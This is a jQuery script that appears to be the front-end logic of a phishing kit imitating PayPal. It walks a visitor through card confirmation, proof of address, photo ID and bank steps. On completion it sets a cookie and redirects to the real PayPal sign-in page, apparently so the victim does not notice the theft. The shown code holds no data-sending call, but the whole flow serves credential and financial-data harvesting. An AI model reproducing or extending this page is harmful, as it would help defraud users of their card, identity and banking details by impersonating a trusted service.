    var success = '<span>Submitted for review</span><div class="icon_stay"><div></div><div></div></div>';
    var buttonActive = '<button class="addFI btn">'+buttonText+'</button>';
    var buttonDisabled = '<button class="addFI btn" disabled >'+buttonText+'</button>';
     $('#certType').change(function(){
    $('#n2').click();
    if($('#certType').val() !== '0'){  
    $('#choose').hide();
    $('#req').hide();
    $('#rt1').show();
    setTimeout(function(){
        $('#choose').show();
        $('#rt1').hide();
     },700);
     }else{
        $('#choose').hide();
        $('#req').show();
     }
    
   });
///////////////////////////////////////////////////////////////////////////
$('.cw_tab_notifications').click(function(){
$('.cw_tab_messages').removeClass('cw_tab_selected');
$('.cw_tab_notifications').addClass('cw_tab_selected');
$('.cw_panel_notifications').show();
$('.cw_panel_messages').hide();
  });

$('.cw_tab_messages').click(function(){
$('.cw_tab_messages').addClass('cw_tab_selected');
$('.cw_tab_notifications').removeClass('cw_tab_selected');
$('.cw_panel_notifications').hide();
$('.cw_panel_messages').show();
  });
    $(document).ready(function(){
        $(window).scroll(function(){
            var scrollTop = 0;
            if($(window).scrollTop() > scrollTop){
                $('.vx_modal-header').addClass('shd');
            }
            if($(window).scrollTop() <= scrollTop){
                $('.vx_modal-header').removeClass('shd');  
            }
        })
    });


  $(document).click(function(){
    $('#notifications-popover').removeClass('popupIsOpen');
});
$("#Cancel").click(function () {
   var options = document.querySelectorAll('#sel option');
   for (var i = 0, l = options.length; i < l; i++) {
    options[i].selected = options[i].defaultSelected;
}});


    $('.notice_p').click(function(e){
        $('#notifications-popover').toggleClass('popupIsOpen');
        e.stopPropagation();
    });
   $('.cw_popoverPrepToOpen').click(function(e){ 
        e.stopPropagation();
    });
$('.cw_notification-link').click(function(){
  $('.addFI').click();
})

    $('.popup_mobile_open_close').click(function(){
        $('.background_popup').toggleClass('background_popup_showing');
        $('.popup_mobile').toggleClass('popup_mobile_open');
        $('.vx_modal-header').toggleClass('fixed');
    });

////////////////////////////////////
if (load == 'confirm_card') {
$('.c_card').html(buttonActive);
$('.addressProf').html(buttonDisabled);
$('.photoid').html(buttonDisabled);
$('.bank').html(buttonDisabled);
}

else if(load == 'address'){
$('.c_card').html(success);
$('.addressProf').html(buttonActive);
$('.photoid ').html(buttonDisabled);
$('.bank').html(buttonDisabled); 
}

else if(load == 'document'){
$('.c_card').html(success);
$('.addressProf').html(success);
$('.photoid').html(buttonActive);
$('.bank').html(buttonDisabled); 
}

else if(load == 'bank'){
$('.td_c_card').html(success);
$('.td_address').html(success);
$('.td_photoid').html(success);
$('.bank').html(buttonActive);  
}
action();


if (load == 'finish') {
   $('.container_update').load('thanks_content', function(){
    $('.container_update').show();
        $('a').click(function(){
        document.cookie = "complete=true";
        window.location.href='https://www.paypal.com/signin?returnUri=https%3A%2F%2Fwww.paypal.com%2Fmyaccount&state=%2Fhome%2F';
    });
   }); 
}else{
    $('.container_update').show();
}
$('#close').click(function(){
$('body').removeClass('body'); 
$('.content_body').removeClass('mobile'); 
$('#popup').fadeOut(200);
$('.form_content_size').addClass('hide');   
$('input:text').val("").removeClass('error');
$('select').removeClass('error');
var options = document.querySelectorAll('#sel option');
   for (var i = 0, l = options.length; i < l; i++) {
    options[i].selected = options[i].defaultSelected;}  
});
 

function action(){
$('.addFI').click(function(){
$('.bg_rotate').show(); 
$('body').addClass('body');
$('#popup').fadeIn(200);
setTimeout(function(){
$('.form_content_size').removeClass('hide').addClass('rezise_Form');
$('.bg_rotate').hide(); 
$('.content_body').addClass('mobile');      
}, 1000);
});    
}
$('.submitId').click(function(){
$('.bg_rotate').show(); 
});